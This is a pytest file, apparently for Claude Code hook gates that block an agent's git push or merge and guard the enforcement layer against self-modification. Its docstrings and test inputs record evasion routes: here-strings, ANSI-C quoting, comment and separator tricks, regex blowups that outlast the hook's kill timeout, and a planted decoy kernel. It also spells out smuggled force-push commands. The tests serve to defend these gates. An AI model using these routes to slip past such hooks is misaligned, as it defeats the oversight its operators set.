    # resolves to something no gate asks about
    'echo "git! and git!"',
    'echo "git! done!"',
    'echo "100% done with git"',
])
def test_a_lone_bang_is_not_a_variable_reference(command):
    """The price of reading `!` as a metacharacter, and it is why the form matters.

    Every line here is prose that mentions git and holds no git call in any shell — measured — and
    the first seven were refused by gate_git, gate_packaging_decision and gate_pipeline while `!`
    sat naked in the undetermined set. The exclamation mark after `git` is the most ordinary thing
    a person writes about git.
    """
    assert not _compat.wants_push_or_merge(command), command


def test_a_here_string_is_the_third_way_of_handing_a_shell_its_commands():
    """`bash <<< 'git push --force origin main'` — a real push that reached no gate at all.

    Not a hole of omission but one this file DUG: `_argument_scan` drops a redirection together
    with its target, which is right for every other redirection (a target never reaches the
    program) and here deletes the code itself. The known-holes comment covered it, if at all,
    under "a heredoc fed to `sh`" — a different mechanism, and a comment that describes the wrong
    mechanism does not name the hole.
    """
    assert _compat.wants_push_or_merge("bash <<< 'git push --force origin main'")
    assert "push" in _compat.git_subcommands("bash <<< 'git push --force origin main'")
    assert _compat.wants_push_or_merge('sh <<<"git merge feat/PR-0001-x"')
    # ...and the rule this is an exception to still holds: `cat` is not a shell, so its here-string
    # is data, and a redirection's target still reaches no program
    assert not _compat.wants_push_or_merge("cat <<< 'git push --force origin main'")
    assert not _compat.wants_push_or_merge("git status > 'git push --force origin main'")


def test_an_escaped_space_does_not_open_a_comment():
    """A `#` opens a comment at the start of a WORD, and an escaped space does not end one.

    `bash -c 'echo a\\ # ; git rev-parse --short HEAD'` prints `a #` AND the hash: the escaped
    space keeps the word open, so the `#` is data. The scan asked the question on the raw text,
    where that space is still a space, cut the line at the `#`, and `echo a\\ # ; git push --force
    origin main` reached none of the eight hooks — a class HEAD still caught. The word view holds
    the answer (`\\x00`), and the counter-cases below are why the fix cannot simply be "never
    treat `#` as a comment": a real comment must still take the rest of the line.
    """
    assert _compat.wants_push_or_merge("echo a\\ # ; git push --force origin main")
    assert _compat.wants_push_or_merge("echo a\\ # ; git merge feat/PR-0001-x")
    # ...an empty quote pair OPENS a word too, and emits nothing into either view — which is why
    # `word_start` is carried per branch instead of read back off the characters emitted so far
    assert _compat.wants_push_or_merge("echo ''# ; git push --force origin main")
    # ...and a `#` that really does begin a word still comments out the rest of the line
    assert not _compat.wants_push_or_merge("echo a # ; git push --force origin main")
    assert not _compat.wants_push_or_merge("# git push --force origin main")
    assert not _compat.wants_push_or_merge("git status # then git push --force origin main")


def test_a_command_separator_ends_a_word_so_the_hash_after_it_is_a_comment():
    """The other half of "start of a word", and it was answered by `.isspace()` alone.

    `;`, `&` and `|` are not stop characters for the scan, so they arrive inside a RUN, and
    `';'.isspace()` is False — which left `word_start` False after them. `git status;# git push
    --force origin main` is one `git status` and a comment in a real bash 5.2 (measured with a
    logging shim: only `GITCALL status`), and the reader read the push and had three gates refuse
    it. Fail-closed, but a false alarm and a claim the code did not build: the docstring said a
    `#` opens a comment "at the start of a word".

    The counter-cases are the reason this cannot be "a `#` after a separator always comments":
    a separator that is DATA (inside quotes) or ESCAPED must not open a word, or a commit message
    ending in `;` would swallow the push after it.
    """
    assert not _compat.wants_push_or_merge("git status;# git push --force origin main")
    assert not _compat.wants_push_or_merge("git status &# git push --force origin main")
    # ...and the separator still separates, so what follows a real one is still read
    assert _compat.wants_push_or_merge("git status; git push --force origin main")
    assert _compat.wants_push_or_merge("git status && git push --force origin main")
    # ...a separator inside a quoted span is data: it opens no word, so this `#` is data too
    assert _compat.wants_push_or_merge('git commit -m "wip;#" && git push --force origin main')
    # ...and an ESCAPED separator is data as well
    assert _compat.wants_push_or_merge("echo a\\;# ; git push --force origin main")


def test_an_ansi_c_wrapper_payload_is_code_one_level_down_like_any_other():
    """`bash -c $'…'` is `bash -c '…'` with a decoder attached — one character, and the payload
    was never lifted.

    `_WRAPPER_RX` wanted the quoted span directly after `-c `, the `$` broke the match, and because
    `$'…'` then reads as a single word the `git` inside it ended no word either: measured, these
    lines reached NO gate at all. `bash -c` is explicitly listed as COVERED in the known-holes
    comment, so this was a hole the file claimed not to have (house rule 3).
    """
    assert _compat.wants_push_or_merge("bash -c $'git push --force origin main'")
    assert _compat.wants_push_or_merge("eval $'git push --force origin main'")
    assert _compat.wants_push_or_merge("sh -c $'git merge feat/PR-0001-x'")
    assert _compat.wants_push_or_merge("bash -lc $'git push --force origin main'")
    # ...and lifting it out of its quotes hands its backslashes to the escape rule of whichever
    # reading is doing the scanning, which is why there are two readings. The POSIX one consumes
    # the `\\` and comes back with the RESOLVED verb `x70ush` — the escape eats exactly one
    # character, the `x`, so it is `x70ush` and not `xush` — and no gate asks about that. The
    # PowerShell one consumes no backslash at all, reads `\\x70ush`, and answers "the text does
    # not fix this verb". ONE reading answering that is what the gates decide on, and asserting
    # both halves is the point: the line applies, and it applies through the unresolved reading
    # rather than because some reading accidentally spells `push`.
    lifted = _compat.git_invocations("bash -c $'git \\x70ush --force origin main'")
    assert lifted
    assert any(not invocation.resolved for invocation in lifted)
    assert "push" not in {str(invocation.subcommand) for invocation in lifted}
    assert _compat.wants_push_or_merge("bash -c $'git \\x70ush --force origin main'")


@pytest.mark.parametrize("command,verb,arguments", [
    # the plain descriptor: digits that are the whole unquoted word in front of the operator
    ("git push origin main 2>/dev/null", "push", ["origin", "main"]),
    ("git push origin main >/dev/null 2>&1", "push", ["origin", "main"]),
    # ...and the three ways digits in front of the operator are an ARGUMENT, which git receives.
    # Each is decided by a DIFFERENT clause of the rule, which is why all three are here: the
    # quoted one by the digit scan finding nothing in the TEXT, the escaped one by the neighbour
    # test, the escaped-space one by the word view. Removing the neighbour test left all 81
    # selected tests green until the `\\2>` line existed — bash hands git `push 2` there, measured.
    ("git push2>/dev/null", "push2", []),
    ('git push "2">/dev/null', "push", ["2"]),
    ("git push \\2>/dev/null", "push", ["2"]),
    ("git push a\\ 2>/dev/null", "push", ["a 2"]),
])
def test_a_descriptor_is_digits_that_open_an_unquoted_word(command, verb, arguments):
    """Two facts, and neither view holds both — so the rule asks each view for its own.

    UNQUOTED is a fact about the text (`"2"` is an argument), and WHOLE WORD is a fact about the
    word view (`a\\ 2` is the single word `a 2`, so its `2` is no descriptor). Asked on the text
    alone, the escaped-space case silently deleted a character out of an argument; asked on the
    word view alone, the quoted case would. Both directions cost the same thing in the end — a
    gate that miscounts refspecs refuses the most ordinary spelling of a push and teaches people
    to write commands it cannot read.
    """
    invocations = [inv for inv in _compat.git_invocations(command, lower=False)
                   if str(inv.subcommand).lower() == verb]
    assert invocations, command
    assert invocations[0].arguments == arguments, command


@pytest.mark.parametrize("command", [
    # the accepted price of the inversion is paid on the VERB, so an expansion anywhere else in
    # the line is untouched — these are the lines a developer types all day
    "ls $HOME",
    "ls ${HOME}/src",
    "echo $(date) && ls -la $HOME",
    "cat *.py | wc -l",
    "python -c 'print(1)'",
    # ...and a git call whose verb IS fixed keeps every expansion it likes
    'git commit -m "$MSG"',
    'git commit -m "merge later"',
    'git commit -m "docs: git push blocked by the gate"',
    'git commit -m "fix #3 and push"',
    "git status",
    "git log --oneline -20",
    "git diff --stat HEAD~1",
    "git add -A",
    "git -C $HOME/src status",
    "gitk push",
    "git-lfs push origin main",
])
def test_the_inversion_does_not_widen_past_the_verb(command):
    """The counter-battery: "block when unsure" is trivially satisfiable by blocking everything.

    Every line here has an expansion, a glob, a quoted `push` or a `#` in it, and not one of them
    leaves the SUBCOMMAND undetermined — so not one of them may reach a git gate. Without this
    the four tests above would all still pass with `runs` hardwired to True, which is the shape of
    over-triggering that gets an enforcement layer switched off by the people it protects.
    """
    assert not _compat.wants_push_or_merge(command), command


def test_the_git_reader_is_linear_in_the_length_of_the_command():
    """A gate that cannot answer inside its budget is a gate that ALLOWS (spec II.4).

    The host kills a hook at 60 s and a killed hook is not a refusal — the repo says so itself
    (`gate_ledger_valid.TOTAL_BUDGET` exists for this). The reader used to slice the rest of the
    segment out for EVERY `git` word, which is quadratic, and 120 KB of `git ` words — 0.7 % of
    what `STDIN_LIMIT` accepts — took the real `gate_git` process 125.7 s and `gate_push_token`
    59.6 s. Both measured, both past the kill, with the actual force-push at the end of the line.

    Asserted as a RATIO rather than as a wall-clock number, because a threshold in seconds is a
    machine-speed measurement and this is a complexity claim: four times the input must not cost
    dramatically more than four times the work.
    """
    def cost(words):
        command = ": " + "git " * words + "&& git push --force origin main"
        taken = []
        for _run in range(3):
            _compat._scan_views.cache_clear()
            start = time.time()
            assert _compat.wants_push_or_merge(command)
            taken.append(time.time() - start)
        return sorted(taken)[1]

    small = max(cost(2000), 0.005)
    large = cost(16000)
    # eight times the input. Linear is ~8x, the tail-slicing reader was ~64x and, at this size,
    # three orders of magnitude in wall clock — the bound is loose on purpose, because what is
    # being asserted is the SHAPE of the cost and not this machine's speed.
    assert large < small * 40, (small, large)


def test_lifting_wrapper_payloads_is_linear_in_the_length_of_the_command():
    """The same budget, one step earlier — and the step that iterating made three times as costly.

    Lifting used to ask ONE pattern for "a quoted span followed by `| sh`", which made the engine
    try to build a span at every quote character in the line; every quote that never closes cost
    it the rest of the line. Measured on `bash -c "…\\"…\\""` repeated: 0.18 s at 13 KB, 0.72 s at
    26 KB, i.e. FOUR times the cost for twice the length, which puts `GIT_READ_LIMIT`'s own
    512 KiB at some five minutes — and that was true before this round, with a single pass. A
    fixpoint loop over it would have tripled it.

    So the piped form is read by a left-to-right scan now (`_lift_piped_payloads`), and the
    DISCRIMINATING assertion is a CEILING rather than a ratio — the opposite of the two tests
    above, and the reason is arithmetic rather than taste. At FOUR times the input a linear reader
    costs 4x and a quadratic one 16x (measured here: 0.165 s at 13 KB, 0.688 s at 26 KB, 3.609 s
    at 52 KB — 4.2x per doubling, so ~17x per quadrupling). Those two numbers are too close for a
    ratio to carry the test on its own: the two linearity tests above buy their headroom by
    measuring 8x input against a 40x bound, and there is no bound between 4 and 17 with anything
    like that margin.

    Both bounds here are therefore MEASURED RATES, over TWO independent runs of 20 evaluations
    each on an idle machine, so the next round does not have to derive them again:
      * the previous `4 *` ratio bound: ratios ran 3.17–4.93 (median 4.02) and 3.22–4.71
        (median 4.03), i.e. 12/20 RED in BOTH runs — a 60 % flake, and a flaky cost test is worse
        than none: it broke two mutation runs and made a green full suite an accident.
      * `10 *`: 0/40 red, twice the worst ratio observed and still 1.7x under the quadratic.
      * the `< 1.0 s` ceiling at 1600 repetitions: 0.112–0.184 s and 0.126–0.189 s, medians 0.141
        and 0.150 s, 0/40 red — six times the real cost and a fiftieth of the 57.6 s the quadratic
        pattern takes at that same size.

    BOTH lines are here because they fail in OPPOSITE directions as the machine changes, and that
    is the only defence an absolute number has. On much FASTER hardware the ceiling stops
    discriminating (everything fits under a second) and the ratio still fires; on much SLOWER
    hardware or under load the ceiling is the one at risk of flaking and the ratio is unaffected,
    because a ratio divides the machine out. The numbers above are from ONE machine (Windows 11,
    CPython 3.13, idle), so they bound this host and not the class of hosts — which is why neither
    line is trusted alone.

    Measured with the quadratic pattern restored, both lines fire: cost(1600) 57.642 s (ceiling
    RED) and cost(3200)/cost(800) = 17.37 (ratio RED), against 0.120 s and 3.89 for the shipped
    scan. So the mutation that puts the cost back is caught twice, not once.
    """
    unit = 'bash -c "bash -c \\"eval \'git push\'\\"" '

    def cost(repetitions):
        command = unit * repetitions
        taken = []
        for _run in range(3):
            start = time.time()
            _compat.unwrap_shell_payload(command)
            taken.append(time.time() - start)
        return sorted(taken)[1]

    # ~60 KB, an eighth of what `GIT_READ_LIMIT` accepts — the ceiling is what catches a quadratic
    assert cost(1600) < 1.0
    # ...and the shape beside it, so a small constant cannot hide a growing exponent
    assert cost(3200) < 10 * max(cost(800), 0.005)


def test_the_wrapper_pattern_does_not_backtrack_exponentially():
    """A pattern whose cost explodes on ordinary-looking text is a bypass with no payload at all.

    `_WRAPPER_OPTION` used to allow a dash right after the leading dashes, so `--no-cache` parsed
    two ways and every option DOUBLED the work when the overall match failed. Measured on
    `echo bash --a-b×N ; git push --force origin main`, medians of three: 0.020 s at 14 options,
    0.270 s at 18, 4.011 s at 22, and **65.550 s at 26** — already PAST the host's 60 s kill,
    where a killed hook is an ALLOW and not a refusal. That line was a complete bypass with no
    quoting trick in it, and the pattern was HEAD's, so it was one before this round too.

    Asserted as a wall-clock CEILING and not as a ratio, unlike the two tests above: exponential
    growth does not show up as a shape at the sizes a test can afford, it shows up as the process
    not coming back. A second is four orders of magnitude above the linear cost measured here
    (0.007 s at FOUR THOUSAND options) and still well inside the kill, so the number is not this
    machine's speed. Twenty-four options is the largest size that still FAILS in seconds rather
    than in hours when the ambiguity is put back — which is what a mutation run needs.
    """
    for count in (12, 24):
        command = "echo bash " + "--a-b " * count + "; git push --force origin main"
        start = time.time()
        assert _compat.wants_push_or_merge(command), count
        assert time.time() - start < 1.0, count


def test_an_unresolvable_verb_is_a_refusal_reason_of_its_own():
    """A gate that applies because it could not READ the verb must say so.

    `_ends_word` claimed in a comment that "the gate refuses with 'spell the subcommand literally'
    rather than silently standing down"; measured, `cd C:\\src\\git\\repo` got "no quality pipeline
    found (scripts/quality.py)" from gate_pipeline, "no QA Evidence in this project" from gate_git
    and "the packaging/deployment decision is unmade" from gate_packaging_decision — three
    refusals, none of them nameable and none of them compliable-with. The note exists so the
    sentence the comment promised is actually in the message (`stop` appends it, so the eight
    gates cannot each forget), and the negative half is what keeps it from being noise on every
    ordinary push.
    """
    assert "spell the subcommand literally" in _compat.unresolved_verb_note("git $V --force")
    assert "spell the subcommand literally" in _compat.unresolved_verb_note("git${IFS}push -f")
    assert "spell the subcommand literally" in _compat.unresolved_verb_note('cmd /c "git p^ush"')
    # ...and nothing at all where the text DOES fix the verb, or where there is no git call
    assert _compat.unresolved_verb_note("git push --force origin main") == ""
    assert _compat.unresolved_verb_note("git merge feat/PR-0001-x") == ""
    assert _compat.unresolved_verb_note("ls $HOME") == ""
    assert _compat.unresolved_verb_note("") == ""
    # ...and silence over the read bound, where every verb is unresolved for a reason no spelling
    # fixes — advice that cannot be followed is the defect this note exists to end
    assert _compat.unresolved_verb_note("echo " + "x" * (_compat.GIT_READ_LIMIT + 1)) == ""


def test_undersized_payload_passes_the_bridge(tmp_path):
    result = run_probe(tmp_path, "_kernel.payload('probe')\nsys.exit(0)\n",
                       payload=json.dumps({"tool_name": "Write"}))
    assert result.returncode == 0


def test_unparseable_payload_blocks_the_bridge(tmp_path):
    """`_compat.load()` returns {} for garbage, and every gate is shaped
    `if data.get("tool_name") != X: sys.exit(0)` — so {} is ALLOW. Same door as the overflow
    case, one step further in."""
    result = run_probe(tmp_path, "_kernel.payload('probe')\nsys.exit(0)\n",
                       payload="this is not json at all")
    assert result.returncode == 2
    assert "could not be read or parsed" in result.stderr


def test_payload_is_memoised_because_stdin_drains_once(tmp_path):
    """A gate that factors work into a helper calling payload() again would otherwise decide on
    the {} of the second read — and a dispatch gate is exactly that shape."""
    result = run_probe(tmp_path,
                       "first = _kernel.payload('probe')\n"
                       "second = _kernel.payload('probe')\n"
                       "print(first == second, first.get('tool_name'))\n"
                       "sys.exit(0)\n",
                       payload=json.dumps({"tool_name": "Task", "tool_input": {}}))
    assert result.returncode == 0, result.stderr
    assert result.stdout.split() == ["True", "Task"]


# -- kernel resolution ---------------------------------------------------------

def test_import_kernel_finds_the_repo_checkout():
    module = _kernel.import_kernel(ROOT)
    assert os.path.abspath(module.__file__) == os.path.join(TEAM_KITS, "kernel", "__init__.py")


def test_kernel_state_is_reachable_as_an_attribute():
    assert _kernel.import_kernel(ROOT).state.ProjectState is not None


def _decoy_probe(tmp_path, preload_team_kits):
    """A process with a competing `kernel` package planted ahead of ours on sys.path."""
    decoy = tmp_path / "decoy"
    write(str(decoy / "kernel" / "__init__.py"), "")
    write(str(decoy / "kernel" / "state.py"), "class ProjectState:\n    pass\n")
    probe = tmp_path / "probe.py"
    write(str(probe),
          "import sys\n"
          "sys.path.insert(0, %r)\n"
          "%s"
          "sys.path.insert(0, %r)\n"
          "import _kernel\n"
          "module = _kernel.import_kernel(%r)\n"
          "print(module.__file__)\n"
          % (HOOKS,
             ("sys.path.append(%r)\n" % TEAM_KITS) if preload_team_kits else "",
             str(decoy), ROOT))
    env = dict(os.environ, CLAUDE_PROJECT_DIR=ROOT)
    env.pop("HARNESS_KERNEL_PATH", None)
    return subprocess.run([sys.executable, str(probe)], capture_output=True, text=True,
                          env=env, timeout=120)


def test_a_decoy_kernel_earlier_on_the_path_cannot_take_over(tmp_path):
    """Import PRECEDENCE, not just presence. Appending the resolved parent instead of inserting
    it let a `kernel` package planted via PYTHONPATH / site-packages / a stray in-repo copy win
    the import, and gates were handed a foreign ProjectState with no error at all."""
    result = _decoy_probe(tmp_path, preload_team_kits=False)
    assert result.returncode == 0, result.stderr
    assert result.stdout.strip() == os.path.join(TEAM_KITS, "kernel", "__init__.py")


def test_a_decoy_wins_the_import_only_to_be_caught_by_the_identity_check(tmp_path):
    """When the resolved parent is ALREADY on sys.path, the insert never happens and the decoy
    genuinely wins the import — the post-import identity check is the only defence left, and
    without this case it is dead code no test would notice being deleted."""
    result = _decoy_probe(tmp_path, preload_team_kits=True)
    assert result.returncode == 2
    assert "the import produced" in result.stderr


def test_import_does_not_leave_the_resolved_parent_on_sys_path(tmp_path):
    """`<repo>/.claude` left at position 0 would shadow a stdlib module for the rest of the
    process; the package's own __path__ keeps submodule imports working without it."""
    probe = tmp_path / "probe.py"
    write(str(probe),
          "import sys\n"
          "sys.path.insert(0, %r)\n"
          "import _kernel\n"
          "_kernel.import_kernel(%r)\n"
          "print(%r in sys.path)\n"
          "print(_kernel.kernel_module('hashing').HASH_SCHEMA_VERSION)\n"
          % (HOOKS, ROOT, TEAM_KITS))
    env = dict(os.environ, CLAUDE_PROJECT_DIR=ROOT)
    env.pop("HARNESS_KERNEL_PATH", None)
    result = subprocess.run([sys.executable, str(probe)], capture_output=True, text=True,
                            env=env, timeout=120)
    assert result.returncode == 0, result.stderr
    assert result.stdout.split() == ["False", "1"]


@pytest.mark.skipif(os.name != "nt", reason="drive-letter case is a Windows-only path identity")
def test_foreign_kernel_check_ignores_drive_letter_case():
    """_root deliberately uppercases the drive while sys.path entries keep their given case; a
    plain string compare reported the SAME kernel as a foreign installation and blocked every
    gated action with a message pointing at a second installation that does not exist."""
    _kernel.import_kernel(ROOT)
    assert _kernel.import_kernel(ROOT[0].swapcase() + ROOT[1:]) is sys.modules["kernel"]


def test_override_is_authoritative_not_merely_first(tmp_path):
    os.environ["HARNESS_KERNEL_PATH"] = str(tmp_path)
    try:
        assert _kernel.kernel_parents(ROOT) == [str(tmp_path)]
    finally:
        del os.environ["HARNESS_KERNEL_PATH"]


def test_a_stale_override_names_the_override_as_the_remedy(tmp_path):
    """"Re-run the scaffold" is the wrong instruction when an explicit override is what broke."""
    os.environ["HARNESS_KERNEL_PATH"] = str(tmp_path / "nowhere")
    try:
        with pytest.raises(_kernel.KernelUnavailable) as exc:
            _kernel.import_kernel(str(tmp_path))
    finally:
        del os.environ["HARNESS_KERNEL_PATH"]
    assert "HARNESS_KERNEL_PATH" in str(exc.value)


def test_missing_kernel_without_override_points_at_the_scaffold(tmp_path, monkeypatch):
    monkeypatch.delenv("HARNESS_KERNEL_PATH", raising=False)
    monkeypatch.setattr(_kernel, "kernel_parents", lambda root: [str(tmp_path / "nowhere")])
    with pytest.raises(_kernel.KernelUnavailable) as exc:
        _kernel.import_kernel(str(tmp_path))
    assert "scaffold" in str(exc.value)


def test_open_state_refuses_when_there_is_no_canonical_state(tmp_path, monkeypatch):
    monkeypatch.setenv("HARNESS_KERNEL_PATH", TEAM_KITS)
    with pytest.raises(_kernel.KernelUnavailable) as exc:
        _kernel.open_state(str(tmp_path))
    assert "fail-closed" in str(exc.value)


def test_open_state_returns_a_project_state(tmp_path, monkeypatch):
    monkeypatch.setenv("HARNESS_KERNEL_PATH", TEAM_KITS)
    os.makedirs(str(tmp_path / "project_memory"))
    state = _kernel.open_state(str(tmp_path))
    assert state.root == os.path.abspath(str(tmp_path / "project_memory"))


# -- bootstrap (spec II.4 "Bootstrap/Migration ist kein Config-Flag") ----------

def _marker(tmp_path, expires_in=600.0, **overrides):
    import time
    marker = {"expires_at_epoch": time.time() + expires_in,
              "user_confirmed": True,
              "installer_run": "scaffold-2026-07-24-abc123"}
    marker.update(overrides)
    write(str(tmp_path / ".claude" / "kit_state.json"), json.dumps({"bootstrap": marker}))


def test_no_marker_means_no_bootstrap(tmp_path):
    assert _kernel.bootstrap_active(str(tmp_path)) is False


def test_valid_marker_opens_bootstrap_on_an_empty_state(tmp_path):
    _marker(tmp_path)
    assert _kernel.bootstrap_active(str(tmp_path)) is True


def test_expired_marker_is_inert(tmp_path):
    _marker(tmp_path, expires_in=-1)
    assert _kernel.bootstrap_active(str(tmp_path)) is False


def test_marker_cannot_grant_standing_permission(tmp_path):
    """A far-future TTL would turn the bootstrap window into a permanent bypass."""
    _marker(tmp_path, expires_in=_kernel.BOOTSTRAP_MAX_TTL + 60)
    assert _kernel.bootstrap_active(str(tmp_path)) is False


def test_marker_without_user_confirmation_is_inert(tmp_path):
    _marker(tmp_path, user_confirmed=False)
    assert _kernel.bootstrap_active(str(tmp_path)) is False


def test_marker_without_an_installer_run_is_inert(tmp_path):
    _marker(tmp_path, installer_run="")
    assert _kernel.bootstrap_active(str(tmp_path)) is False


@pytest.mark.parametrize("malformed", [[1], "yes", 7])
def test_malformed_marker_returns_false_instead_of_raising(tmp_path, malformed):
    """A truthy non-dict used to raise AttributeError past the caller's error handling — and
    outside a fail_closed guard that means exit 1, which Claude Code reads as ALLOW."""
    write(str(tmp_path / ".claude" / "kit_state.json"), json.dumps({"bootstrap": malformed}))
    assert _kernel.bootstrap_active(str(tmp_path)) is False


def test_marker_cannot_reopen_bootstrap_once_state_exists(tmp_path):
    """The teeth of the rule: a lead that writes itself a marker still gets nothing, because a
    non-empty state closes bootstrap regardless of what the marker says."""
    _marker(tmp_path)
    write(str(tmp_path / "project_memory" / "product" / "active" / "PR-0001.yaml"),
          "id: PR-0001\n")
    assert _kernel.bootstrap_active(str(tmp_path)) is False


def test_kernel_lock_and_audit_do_not_count_as_state(tmp_path):
    """The installer must not close its own gate: the kernel takes its lock and leaves .stale-*
    remnants BY DESIGN (kernel/lock.py), and the scaffold creates the typed tree before the
    first item exists."""
    from kernel.lock import _DEFAULT_NAME
    _marker(tmp_path)
    state = tmp_path / "project_memory"
    write(str(state / _DEFAULT_NAME), "pid: 1\n")
    write(str(state / (_DEFAULT_NAME + ".stale-123")), "pid: 1\n")
    write(str(state / ".audit" / "hook_events.jsonl"), "{}\n")
    write(str(state / "generated" / "index.yaml"), "items: []\n")
    os.makedirs(str(state / "product" / "active"), exist_ok=True)
    os.makedirs(str(state / "tasks" / "active"), exist_ok=True)
    assert _kernel.state_is_empty(str(tmp_path)) is True
    assert _kernel.bootstrap_active(str(tmp_path)) is True


def test_a_nested_item_anywhere_makes_the_state_non_empty(tmp_path):
    write(str(tmp_path / "project_memory" / "approvals" / "APR-0001.yaml"), "id: APR-0001\n")
    assert _kernel.state_is_empty(str(tmp_path)) is False


@pytest.mark.parametrize("artifact", ["design/revisions/DSN-0001.html",
                                      "architecture/active/ARC-0001.drawio.svg",
                                      "system/active/SR-0001.yml"])
def test_non_yaml_canonical_artifacts_also_count_as_state(tmp_path, artifact):
    """spec II.2 puts frozen DSN revisions and draw.io ARC/WFR files in the canonical state. A
    project whose YAML items were archived but whose approved revisions remain is not a
    greenfield install, and must not re-open the bootstrap precondition."""
    write(str(tmp_path / "project_memory" / artifact), "x")
    assert _kernel.state_is_empty(str(tmp_path)) is False


def test_kit_state_json_is_on_the_enforcement_blocklist(tmp_path):
    """bootstrap_active's guarantees rest on this file being unwritable by an agent."""
    payload = {"tool_name": "Write", "cwd": str(tmp_path),
               "tool_input": {"file_path": str(tmp_path / ".claude" / "kit_state.json"),
                              "content": "{}"}}
    for kit in KITS:
        result = run_hook("guard_harness_selfmod.py", payload, tmp_path, kit=kit)
        assert result.returncode == 2, kit
        assert "ENFORCEMENT LAYER" in result.stderr


# -- fail-closed catch-all (spec II.4; II.12 "simulierter Hook-Crash -> Block") -

def test_internal_error_becomes_a_block(tmp_path):
    result = run_probe(tmp_path, "with _kernel.fail_closed('probe'):\n    1 / 0\n")
    assert result.returncode == 2
    assert "internal error" in result.stderr
    assert "scripts/harness.py doctor" in result.stderr


def test_the_diagnosis_names_the_line_that_actually_failed(tmp_path):
    """A positive traceback limit keeps the OUTERMOST frames, where frame 1 is always the
    contextmanager's own `yield` — so the failing line was the first thing dropped."""
    result = run_probe(tmp_path,
                       "def inner():\n"
                       "    raise FileNotFoundError('state file gone')\n"
                       "def outer():\n"
                       "    inner()\n"
                       "with _kernel.fail_closed('probe'):\n"
                       "    outer()\n")
    assert result.returncode == 2
    diagnosis = result.stderr.split("Diagnosis:", 1)[1]
    assert "inner" in diagnosis
    assert "state file gone" in diagnosis


def test_keyboard_interrupt_blocks_rather_than_exiting_one(tmp_path):
    """KeyboardInterrupt is a BaseException: it exited 1 / 3221225786, both of which Claude
    Code reads as ALLOW — and a hook timeout is exactly when a call must not slip through."""
    result = run_probe(tmp_path,
                       "with _kernel.fail_closed('probe'):\n    raise KeyboardInterrupt()\n")
    assert result.returncode == 2


def test_module_level_failure_outside_the_guard_still_blocks(tmp_path):
    """What a context manager structurally cannot cover: the excepthook must."""
    result = run_probe(tmp_path, "raise RuntimeError('module scope exploded')\n")
    assert result.returncode == 2
    assert "failed to run" in result.stderr


def test_a_failed_import_after_the_bridge_loads_still_blocks(tmp_path):
    result = run_probe(tmp_path, "import a_module_that_does_not_exist_xyz\n")
    assert result.returncode == 2
    assert "failed to run" in result.stderr


def _bundle_with_broken_helper(tmp_path, gate_body):
    """A hook bundle whose _compat.py is half-written — the most likely artifact of an
    interrupted kit update, and the case where `import _kernel` itself fails."""
    bundle = tmp_path / "hooks"
    shutil.copytree(HOOKS, str(bundle))
    write(str(bundle / "_compat.py"), "def load(  # truncated mid-write\n")
    gate = bundle / "gate_probe.py"
    write(str(gate), gate_body)
    return gate


def test_the_gate_preamble_survives_its_own_helpers_being_broken(tmp_path):
    """The excepthook cannot cover a failure of `import _kernel`, because it is installed BY
    that import. GATE_PREAMBLE is the only construct that still refuses."""
    gate = _bundle_with_broken_helper(
        tmp_path, _kernel.GATE_PREAMBLE + "\n_kernel.run_gate('gate_probe', lambda: None)\n")
    result = subprocess.run([sys.executable, str(gate)], input="{}", capture_output=True,
                            text=True, env=dict(os.environ, CLAUDE_PROJECT_DIR=str(tmp_path)),
                            timeout=120)
    assert result.returncode == 2
    assert "could not load hook helpers" in result.stderr


def test_without_the_preamble_the_same_break_exits_one(tmp_path):
    """The control that gives the test above its meaning: exit 1 is what Claude Code reads as a
    non-blocking error, i.e. the call proceeds."""
    gate = _bundle_with_broken_helper(
        tmp_path,
        "import os, sys\n"
        "sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))\n"
        "import _kernel\n"
        "_kernel.run_gate('gate_probe', lambda: None)\n")
    result = subprocess.run([sys.executable, str(gate)], input="{}", capture_output=True,
                            text=True, env=dict(os.environ, CLAUDE_PROJECT_DIR=str(tmp_path)),
                            timeout=120)
    assert result.returncode == 1


USES_BRIDGE = re.compile(r"^\s*(?:import _kernel\b|from _kernel import )", re.M)
# What makes a hook a GATE is that it can refuse — not that it imports the bridge. The bridge also
# publishes read-only facts (`kernel_module`, `disarm`), and a comfort hook may need those. Keyed
# on the blocking machinery so the classification follows what the file DOES.
USES_BLOCKING = re.compile(r"\b(?:run_gate|fail_closed|_kernel\.block|payload)\s*\(")


def _stage_launcher(hooks, kit="dev-team", source=None):
    """Copy `_gate.py` AND everything it imports, transitively, into `hooks`. Returns the names.

    The closure is `conftest.sibling_import_closure` — ONE home, shared with
    `test_hooks._stage_kernel_bridge`, so neither can be a hand-written list that goes one short.
    The launcher gained its first sibling dependency with BUG-0013 (`_stdlib_guard`, which installs
    the standard-library guard before any gate is compiled or executed) and REFUSES when that
    import fails, so a stager that staged `_gate.py` alone would make every launcher test measure
    the fail-closed refusal instead of its subject. Transitive rather than one-level: the day
    `_stdlib_guard` (or any dependency) grows a sibling of its own, a one-level parse of `_gate.py`
    would miss it and reopen exactly that failure.
    """
    source = source or os.path.join(TEAM_KITS, kit, "hooks")
    names = conftest.sibling_import_closure("_gate.py", source)
    os.makedirs(str(hooks), exist_ok=True)
    for name in names:
        shutil.copyfile(os.path.join(source, name), os.path.join(str(hooks), name))
    return names


def test_the_launcher_is_staged_with_everything_it_imports():
    """The direct dependency, asserted: the launcher and the guard it must not run without.

    Named because it is the dependency that exists TODAY; this turns red if the launcher stops
    importing the guard (the day BUG-0013 is open again). The GRANDCHILD case — the one a
    one-level parse would miss — is the separate test below."""
    import tempfile
    staged = tempfile.mkdtemp(prefix="launcher-staging-")
    try:
        names = _stage_launcher(os.path.join(staged, "hooks"))
        assert "_gate.py" in names and "_stdlib_guard.py" in names, names
        assert set(names) <= set(os.listdir(os.path.join(staged, "hooks"))), "not all staged"
    finally:
        shutil.rmtree(staged, ignore_errors=True)


def test_stage_launcher_follows_a_grandchild_import(tmp_path):
    """`_stage_launcher` must follow the closure to ANY depth, not just `_gate.py`'s own imports.

    RED WITHOUT THE FIX: a one-level parse of `_gate.py` sees `_stdlib_guard` (a direct import) but
    NOT a module `_stdlib_guard` itself imports. Here a synthetic hooks tree gives `_stdlib_guard`
    a fresh sibling; the transitive closure stages it, a one-level parse would not — and a launcher
    test staged one module short measures the launcher's fail-closed refusal, not its subject,
    which is the very failure the closure exists to prevent.
    """
    source = tmp_path / "src"
    source.mkdir()
    for name in os.listdir(HOOKS):
        if name.endswith(".py"):
            shutil.copyfile(os.path.join(HOOKS, name), str(source / name))
